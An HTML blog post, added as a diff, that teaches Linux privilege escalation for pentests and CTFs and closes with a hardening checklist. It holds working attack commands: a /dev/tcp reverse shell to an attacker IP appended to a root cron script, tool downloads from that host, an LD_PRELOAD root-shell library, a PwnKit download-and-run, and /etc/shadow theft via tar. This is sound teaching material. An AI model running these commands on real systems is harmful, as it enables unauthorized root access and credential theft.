@@ -1,0 +1,182 @@
+<!doctype html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="Linux Privilege Escalation techniques — SUID, sudo, cron, kernel exploits"><meta property="og:type" content="article"><title data-page-title="Linux Privilege Escalation: From User to Root"></title><link rel="icon" type="image/svg+xml" href="../assets/img/avatar.svg"><link rel="stylesheet" href="../assets/css/main.css"><link rel="stylesheet" href="../assets/css/syntax.css"><link rel="stylesheet" href="../assets/css/responsive.css"><script src="../assets/js/theme.js"></script></head><body><div class="reading-progress" id="readingProgress"></div><a href="#main-content" class="skip-link">Skip to content</a><div id="app"><div class="sidebar-overlay" id="sidebarOverlay"></div><aside class="sidebar" id="sidebar"><div class="sidebar-inner"><div class="profile" id="sidebarProfile"></div><div class="sidebar-divider"></div><nav class="sidebar-nav" id="sidebarNav"></nav><div class="sidebar-divider"></div><div class="sidebar-stats" id="sidebarStats"></div><div class="sidebar-divider"></div><div class="social-links" id="sidebarSocial"></div></div></aside><div class="main-wrapper"><header class="topbar"><button class="menu-toggle" id="menuToggle" aria-label="Toggle sidebar" aria-expanded="false">&#9776;</button> <span class="topbar-brand" id="topbarBrand"></span><div class="search-wrap" role="search"><div class="search-input-wrap"><span class="search-icon">&#128269;</span> <input type="search" id="searchInput" placeholder="Search posts…" autocomplete="off" aria-label="Search posts"></div><div class="search-results" id="searchResults" role="listbox"></div></div><div class="topbar-actions"><button class="theme-toggle" id="themeToggle">&#9728;</button></div></header><main class="content-wrapper" id="main-content"><article class="content-main" itemscope itemtype="https://schema.org/BlogPosting"><header class="post-header"><div style="margin-bottom:.75rem"><a href="../categories.html?cat=Linux+Security" class="category-badge">Linux Security</a></div><h1 class="post-title" itemprop="headline">Linux Privilege Escalation: From User to Root</h1><div class="post-header-meta"><span itemprop="datePublished">&#128197; Mar 10, 2024</span> <span>&#9201; 15 min read</span> <span itemprop="author" data-site-author></span></div><div class="post-tags" style="margin-top:.75rem"><a href="../tags.html?tag=privilege-escalation" class="tag">#privilege-escalation</a> <a href="../tags.html?tag=linux" class="tag">#linux</a> <a href="../tags.html?tag=suid" class="tag">#suid</a> <a href="../tags.html?tag=sudo" class="tag">#sudo</a> <a href="../tags.html?tag=ctf" class="tag">#ctf</a></div></header><div class="post-full-content" itemprop="articleBody"><p>Privilege escalation is one of the most critical phases of any penetration test or CTF challenge. After gaining an initial foothold on a Linux system, the goal is almost always to elevate from a low-privileged user to <code>root</code>. This post is a comprehensive field guide covering the most common and effective Linux privilege escalation techniques — with real commands, real examples, and the mindset to chain them together effectively.</p><blockquote><strong>⚠️ Disclaimer:</strong> All techniques described here are for educational purposes and authorised penetration testing only. Never run these against systems you do not own or have explicit written permission to test.</blockquote><h2 id="enumeration">1. Enumeration — Know Before You Strike</h2><p>Before attempting any escalation, thorough enumeration separates a skilled pentester from someone who just runs random exploits and hopes. The goal is to map the attack surface: what's running, what's misconfigured, and what's world-writable.</p><h3 id="automated-enumeration">Automated Enumeration with LinPEAS</h3><p><a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener">LinPEAS</a> (Linux Privilege Escalation Awesome Script) is the de-facto standard for automated enumeration. It checks hundreds of vectors and colour-codes results by severity.</p><pre><code class="language-bash"># Download and run directly from memory (no disk write)
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Or transfer to the target and run
+wget http://&lt;ATTACKER_IP&gt;:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh 2&gt;/dev/null | tee /tmp/linpeas.out
+
+# Serve from attacker machine
+python3 -m http.server 8000</code></pre><p>Beyond automated tools, manual enumeration is irreplaceable. Some key commands to run immediately after shell access:</p><pre><code class="language-bash"># System &amp; kernel info
+uname -a
+cat /etc/os-release
+cat /proc/version
+
+# Current user context
+id
+whoami
+groups
+sudo -l
+
+# Network context
+ip a
+ss -tlnp
+cat /etc/hosts
+
+# Interesting files
+find / -writable -type f 2>/dev/null | grep -v proc
+find / -name "*.conf" -readable 2>/dev/null | head -30
+cat ~/.bash_history
+cat /etc/crontab
+ls -la /etc/cron*</code></pre><p>Good enumeration will surface 80% of your escalation paths before you've even tried anything. Take notes, correlate findings, and look for <em>chains</em> — a writable config used by a root-owned cron is worth more than either finding alone.</p><h2 id="suid-sgid">2. SUID / SGID Abuse</h2><p>Set-User-ID (SUID) and Set-Group-ID (SGID) bits allow a binary to execute with the privileges of its <em>owner</em> rather than the caller. When a root-owned binary has the SUID bit set, any user who executes it effectively runs it as root — a powerful primitive for privilege escalation.</p><h3 id="finding-suid">Finding SUID/SGID Binaries</h3><pre><code class="language-bash"># Find all SUID binaries system-wide
+find / -perm -4000 -type f 2>/dev/null
+
+# Find SGID binaries
+find / -perm -2000 -type f 2>/dev/null
+
+# Find both SUID and SGID in one pass
+find / -perm /6000 -type f 2>/dev/null
+
+# Show owner, permissions, and path — easier to triage
+find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;</code></pre><p>Compare the list against <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — a curated database of Unix binaries that can be abused when granted SUID, sudo, or other special privileges. Common SUID candidates to look out for: <code>find</code>, <code>vim</code>, <code>python</code>, <code>bash</code>, <code>cp</code>, <code>nmap</code> (older versions), <code>less</code>, <code>awk</code>.</p><h3 id="gtfobins-examples">GTFOBins Exploitation Examples</h3><pre><code class="language-bash"># If /usr/bin/find has SUID bit set:
+/usr/bin/find . -exec /bin/sh -p \; -quit
+# The -p flag keeps elevated privileges (doesn't drop euid)
+
+# If /usr/bin/vim has SUID:
+/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+# If /usr/bin/awk has SUID:
+/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'
+
+# If /bin/bash itself has SUID (rare but game over):
+/bin/bash -p
+
+# Verify you're root:
+id
+# uid=1001(user) gid=1001(user) euid=0(root) groups=1001(user)</code></pre><p>Always check the <em>actual</em> binary path — sometimes a custom binary has SUID set unintentionally. Read the binary with <code>strings</code> or <code>ltrace</code> to understand what it does before exploiting it.</p><h2 id="sudo-misconfig">3. Sudo Misconfigurations</h2><p>The <code>/etc/sudoers</code> file controls what commands users can run as root (or other users) via <code>sudo</code>. Misconfigurations here are extremely common — especially in CTF machines — and can range from trivially exploitable to nuanced.</p><h3 id="sudo-enumeration">Enumerating Sudo Rights</h3><pre><code class="language-bash">$ sudo -l
+Matching Defaults entries for www-data on target:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
+    (root) NOPASSWD: /usr/bin/vim /var/www/html/*.conf
+    (ALL : ALL) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/less /var/log/*</code></pre><p>Each of these entries is exploitable in a different way:</p><ul><li><strong><code>python3 /opt/backup.py</code></strong> — If <code>backup.py</code> is writable, inject a shell. If it imports local modules, hijack the import.</li><li><strong><code>vim *.conf</code></strong> — Wildcards can be bypassed with shell metacharacters. Even without that, vim can spawn a shell (<code>:!sh</code>).</li><li><strong><code>find</code></strong> — GTFOBins: <code>sudo find . -exec /bin/sh \; -quit</code></li><li><strong><code>less /var/log/*</code></strong> — From the pager, type <code>!sh</code> or <code>!/bin/bash</code> to escape to a shell.</li></ul><h3 id="sudo-env-abuse">LD_PRELOAD / Environment Variable Abuse</h3><p>If <code>env_keep+=LD_PRELOAD</code> appears in the sudoers defaults, you can inject a shared library into a sudo command:</p><pre><code class="language-bash"># 1. Create the malicious shared library
+cat &gt; /tmp/evil.c &lt;&lt; 'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setresuid(0, 0, 0);
+    system("/bin/bash -p");
+}
+EOF
+
+# 2. Compile as a shared object
+gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
+
+# 3. Run any allowed sudo command with LD_PRELOAD pointing to our library
+sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find</code></pre><h2 id="cron-jobs">4. Cron Job Exploitation</h2><p>Scheduled jobs run as a specific user — often root. If a cron job references a script or binary that a low-privileged user can write to, it becomes a trivial escalation: overwrite the target, wait for the cron to fire, get a shell.</p><h3 id="finding-crons">Finding Cron Jobs</h3><pre><code class="language-bash"># System-wide crontab
+cat /etc/crontab
+
+# Per-user crontabs (needs root or the specific user)
+ls -la /var/spool/cron/crontabs/
+
+# Drop-in cron directories
+ls -la /etc/cron.d/
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.daily/
+
+# Use pspy to monitor processes in real-time without root
+wget http://&lt;ATTACKER_IP&gt;:8000/pspy64 -O /tmp/pspy64
+chmod +x /tmp/pspy64
+/tmp/pspy64</code></pre><p><code>pspy</code> is invaluable — it monitors <code>procfs</code> and shows newly spawned processes, revealing hidden cron jobs that don't appear in any crontab file (e.g., triggered by system units or out-of-band schedulers).</p><h3 id="cron-exploitation">Exploiting a Writable Cron Script</h3><p>Suppose <code>/etc/crontab</code> contains:</p><pre><code class="language-bash">* * * * * root /opt/scripts/cleanup.sh
+
+# Check permissions:
+ls -la /opt/scripts/cleanup.sh
+# -rwxrwxr-x 1 root root 45 Mar 10 09:00 /opt/scripts/cleanup.sh
+# World-writable! Append a reverse shell:
+
+echo 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1' &gt;&gt; /opt/scripts/cleanup.sh
+
+# Set up listener on attacker:
+nc -lvnp 4444
+
+# Wait up to 60 seconds for the cron to fire — then enjoy root.</code></pre><p>Another variant: the cron script exists but calls a binary whose <em>path</em> is writable (see PATH abuse, below). Always check what a cron script actually calls, not just the script itself.</p><h2 id="path-abuse">5. Writable PATH Abuse</h2><p>If a SUID binary, sudo command, or cron script calls another program by <em>name</em> rather than absolute path, and you can prepend a writable directory to <code>PATH</code>, you can hijack the call.</p><pre><code class="language-bash"># Suppose the SUID binary /usr/local/bin/sysinfo calls 'id' without a full path.
+# Verify with: strings /usr/local/bin/sysinfo | grep -v lib
+# Output might show: id, uname, df — unqualified names!
+
+# Create a fake 'id' that spawns a shell:
+echo '#!/bin/bash' &gt; /tmp/id
+echo '/bin/bash -p' &gt;&gt; /tmp/id
+chmod +x /tmp/id
+
+# Prepend /tmp to PATH and run the SUID binary:
+export PATH=/tmp:$PATH
+/usr/local/bin/sysinfo
+
+# Result: root shell, because sysinfo runs our /tmp/id as root via SUID</code></pre><p>The same technique applies to sudo commands with <code>SETENV</code> or an absent <code>secure_path</code> in sudoers. Always use <code>strings</code> and <code>strace</code> to understand what a binary actually calls.</p><h2 id="kernel-exploits">6. Kernel Exploits</h2><p>Kernel exploits are the "big guns" — they escalate privileges by exploiting vulnerabilities in the kernel itself. They are powerful but risky: a bad exploit can crash the target. Always prefer other vectors first, and use kernel exploits as a last resort or when the environment is known stable.</p><pre><code class="language-bash"># Check kernel version
+uname -r
+# Example: 4.4.0-116-generic
+
+cat /proc/version
+# Linux version 4.4.0-116-generic (gcc version 5.4.0)
+
+# Check for known CVEs using linux-exploit-suggester
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh
+chmod +x /tmp/les.sh
+/tmp/les.sh
+
+# DirtyCow (CVE-2016-5195) — affects kernels 2.6.22 to 4.8.3
+# One of the most widespread LPE CVEs ever found
+searchsploit dirty cow
+# Compile and run appropriate PoC from Exploit-DB
+
+# Overlayfs (CVE-2023-0386) — affects kernels before 6.2
+# PwnKit (CVE-2021-4034) — polkit pkexec, affects most Linux distros
+wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh
+chmod +x cve-2021-4034.sh &amp;&amp; ./cve-2021-4034.sh</code></pre><p>Use the Linux Exploit Suggester script to cross-reference the kernel version with known CVEs automatically. It outputs colour-coded results with links to PoCs. Kernel 4.x is still found in the wild on older servers — DirtyCow remains highly reliable on unpatched 4.4.x systems.</p><h2 id="capabilities">7. Linux Capabilities</h2><p>Linux capabilities are a fine-grained privilege decomposition of the root privilege set. Instead of running a binary as root, a specific capability can be granted (e.g., <code>CAP_NET_RAW</code> for raw socket access). However, some capabilities — particularly <code>cap_setuid</code> — effectively grant root-level escalation when assigned to an interpreter or tool.</p><pre><code class="language-bash"># Find binaries with elevated capabilities
+getcap -r / 2>/dev/null
+
+# Example dangerous output:
+# /usr/bin/python3.8 = cap_setuid+ep
+# /usr/bin/perl = cap_setuid+ep
+# /usr/bin/ruby = cap_setuid+ep
+# /usr/bin/tar = cap_dac_read_search+ep
+
+# Exploit cap_setuid on python3:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Exploit cap_setuid on perl:
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+# Exploit cap_dac_read_search on tar (read any file, e.g. /etc/shadow):
+/usr/bin/tar -cf /tmp/shadow.tar /etc/shadow 2>/dev/null
+/usr/bin/tar -xf /tmp/shadow.tar -C /tmp
+cat /tmp/etc/shadow</code></pre><p><code>cap_setuid+ep</code> means the capability is effective and permitted — the binary can call <code>setuid(0)</code> to become root at runtime. This is as dangerous as SUID but less visible and often overlooked during hardening reviews. Always run <code>getcap -r / 2>/dev/null</code> in your enumeration checklist.</p><h2 id="nfs-exploits">8. NFS No-Root-Squash Exploitation</h2><p>Network File System (NFS) shares configured with <code>no_root_squash</code> allow a remote root user to interact with the share <em>as root</em>. If an attacker has root on their own machine and can mount the NFS share, they can create SUID binaries on the share that execute as root on the target.</p><pre><code class="language-bash"># On the TARGET — check NFS exports
+cat /etc/exports
+# Example misconfigured output:
+# /home/victim  *(rw,sync,no_root_squash,no_subtree_check)
+
+# On the ATTACKER (as root) — mount the remote share
+showmount -e &lt;TARGET_IP&gt;
+mkdir /mnt/nfs_target
+mount -t nfs &lt;TARGET_IP&gt;:/home/victim /mnt/nfs_target -o nolock
+
+# Create a SUID bash copy on the share (runs as root because no_root_squash)
+cp /bin/bash /mnt/nfs_target/privesc_bash
+chmod +s /mnt/nfs_target/privesc_bash
+
+# Back on the TARGET (as low-priv user):
+ls -la ~/privesc_bash
+# -rwsr-sr-x 1 root root 1234560 Mar 10 privesc_bash
+~/privesc_bash -p
+# bash-5.1# id
+# uid=1001(victim) gid=1001(victim) euid=0(root)
+
+# Clean up afterwards:
+rm ~/privesc_bash
+umount /mnt/nfs_target  # on attacker</code></pre><p>The fix is always to add <code>root_squash</code> (or remove <code>no_root_squash</code>) to the exports file, but it's surprisingly common to see misconfigured NFS in internal networks and older CTF boxes.</p><h2 id="chaining">9. Chaining Techniques</h2><p>Real-world privilege escalation rarely hinges on a single silver bullet. Often, you'll chain multiple lower-severity findings into a full escalation path. A common chain looks like this:</p><ol><li><strong>Enumerate</strong> → find a cron job running as root every minute, executing <code>/opt/monitor.sh</code>.</li><li><strong>Inspect</strong> → <code>monitor.sh</code> calls <code>curl</code> without a full path.</li><li><strong>PATH abuse</strong> → create a malicious <code>curl</code> in <code>/tmp</code>, prepend <code>/tmp</code> to PATH in a writable environment file sourced by the cron job.</li><li><strong>Shell</strong> → when the cron fires, our fake <code>curl</code> runs as root and connects back.</li></ol><p>Thinking in chains and relationships — rather than isolated misconfigs — is what separates effective privilege escalation from button-mashing. Always ask: <em>"What else uses this file / binary / variable?"</em></p><h2 id="remediation">10. Remediation Checklist</h2><p>For defenders and blue teamers, here's a quick hardening checklist to close off the most common escalation vectors:</p><ul><li>Audit SUID/SGID binaries regularly: <code>find / -perm /6000 -type f 2>/dev/null</code>. Remove the bit from anything that doesn't strictly need it.</li><li>Review <code>/etc/sudoers</code> — avoid wildcard paths, never use <code>NOPASSWD</code> for powerful interpreters, always use <code>secure_path</code>.</li><li>Ensure cron scripts and their dependencies are root-owned and not world-writable.</li><li>Regularly apply kernel and package updates — most kernel exploits target known, patched CVEs.</li><li>Audit capabilities with <code>getcap -r /</code> and remove any unneeded <code>cap_setuid</code> or <code>cap_dac_override</code> grants.</li><li>Always configure NFS exports with <code>root_squash</code> and restrict access to specific subnets rather than <code>*</code>.</li><li>Deploy tools like <code>auditd</code>, <code>Falco</code>, or <code>AIDE</code> to detect anomalous privilege escalation attempts at runtime.</li></ul><h2 id="conclusion">Conclusion</h2><p>Linux privilege escalation is a broad, layered discipline. No two machines are the same, and no single checklist covers every edge case. The most important skill is methodical thinking: enumerate deeply, understand what you're looking at, and reason about <em>relationships</em> between misconfigurations rather than treating each finding in isolation.</p><p>Start every engagement with LinPEAS and <code>sudo -l</code>, manually verify the most promising leads, and always check GTFOBins before writing custom exploits. With practice, spotting privilege escalation paths becomes almost instinctive — but the fundamentals covered here will get you root on the vast majority of CTF machines and many real-world systems.</p><p>Happy hacking — responsibly. 🔐</p></div><div id="postNav"></div></article><aside class="content-aside"><div class="widget" style="position:sticky;top:calc(var(--topbar-height) + 1rem)"><div class="widget-title">&#128196; Table of Contents</div><ol class="toc-list" id="tocList"></ol></div><div class="widget"><div class="widget-title">⬡ Tags</div><div class="tags-cloud"><a href="../tags.html?tag=privilege-escalation" class="tag">#privilege-escalation</a> <a href="../tags.html?tag=linux" class="tag">#linux</a> <a href="../tags.html?tag=suid" class="tag">#suid</a> <a href="../tags.html?tag=ctf" class="tag">#ctf</a></div></div><div class="widget"><div class="widget-title">&#128337; Recent Posts</div><div id="recentPostsWidget"></div></div></aside></main><footer class="site-footer" id="siteFooter"></footer></div></div><button class="back-to-top" id="backToTop" aria-label="Back to top">&#8679;</button><script src="../config.js"></script><script src="../assets/js/search.js"></script><script src="../assets/js/main.js"></script><script>document.addEventListener("DOMContentLoaded",(()=>{initPostNav(3)}))</script></body></html>
